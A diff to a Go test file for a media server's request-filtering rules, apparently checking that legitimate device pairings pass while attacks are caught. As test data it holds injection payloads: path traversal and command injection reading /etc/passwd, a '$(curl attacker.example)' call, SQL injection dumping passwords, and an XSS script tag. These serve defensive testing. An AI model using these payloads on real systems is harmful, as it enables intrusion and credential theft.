@@ -341,6 +341,11 @@ func TestTheCavuSetLetsItsClientThrough(t *testing.T) {
 				send(cvBody("POST", "/api/v1/music/connect/hello", map[string]any{"deviceId": g.id(), "name": name, "kind": "phone",
 					"platform": "ios", "standalone": true}), "")
 			}
+			for _, name := range append(cvDevices, "Den", "Kids' room (upstairs)", "Sam's TV #2") {
+				send(cvBody("POST", "/api/v1/pair", map[string]any{"client": g.pick("Cavu for Roku", "Cavu for Android TV", "Cavu TV (beta)"),
+					"deviceName": name}), " (a pairing)")
+			}
+			send(cvBody("POST", "/api/v1/pair", map[string]any{"client": "Cavu for Roku", "deviceName": "", "shared": g.token()}), " (a pairing)")
 			for _, path := range cvPaths {
 				send(cvGet("/api/v1/admin/browse?"+url.Values{"path": {path}}.Encode()), "")
 				send(cvBody("POST", "/api/v1/admin/libraries", map[string]any{"name": "Films", "kind": "movies", "paths": []string{path}}), "")
@@ -444,6 +449,9 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}/../../../etc/passwd"})},
 		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}{ext}; cat /etc/passwd"})},
 		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}$(curl attacker.example){ext}"})},
+		{1, cvBody("POST", api+"/pair", map[string]any{"client": "x' UNION SELECT password FROM users--", "deviceName": "Den"})},
+		{1, cvBody("POST", api+"/pair", map[string]any{"client": "Cavu for Roku", "deviceName": "<script>alert(1)</script>"})},
+		{1, cvBody("POST", api+"/pair", map[string]any{"client": "Cavu for Roku", "deviceName": "Den; cat /etc/passwd"})},
 	}
 	attacks := []cvAttack{
 		// Without a character only the rules that count them see. Where
@@ -492,6 +500,10 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 		{4, cvBody("POST", api+"/admin/settings/smtp", map[string]any{"host": "smtp.example.com", "from": "a);(b"})},
 		{2, cvBody("POST", api+"/admin/settings/smtp", map[string]any{"host": "smtp.example.com", "from": "Cavu <no-reply@example.com>", "From": "x <y@example.com>"})},
 		{2, cvBody("POST", api+"/music/connect/transfer", map[string]any{"id": g.id(), "from": "Cavu <no-reply@example.com>", "clientId": client, "to": g.id()})},
+		// Only a pairing takes client and deviceName as text.
+		{4, cvBody("POST", api+"/together/rooms/"+g.id()+"/join", map[string]any{"client": "a);(b", "device": g.id()})},
+		{4, cvBody("POST", api+"/pair/token", map[string]any{"deviceCode": g.token(), "deviceName": "a);(b"})},
+		{1, cvBody("POST", api+"/pair", map[string]any{"client": "Cavu for Roku", "deviceName": "Den", "shared": "1' OR '1'='1"})},
 		// Only a new file's identify takes the name wholeUnit.
 		{3, cvBody("POST", api+"/admin/items/"+item+"/identify", map[string]any{"provider": "tmdb", "id": "12345", "wholeUnit": true})},
 		{3, cvBody("POST", api+"/admin/ingest/files/"+item+"/identify", map[string]any{"kind": "movie", "wholeUnits": true})},
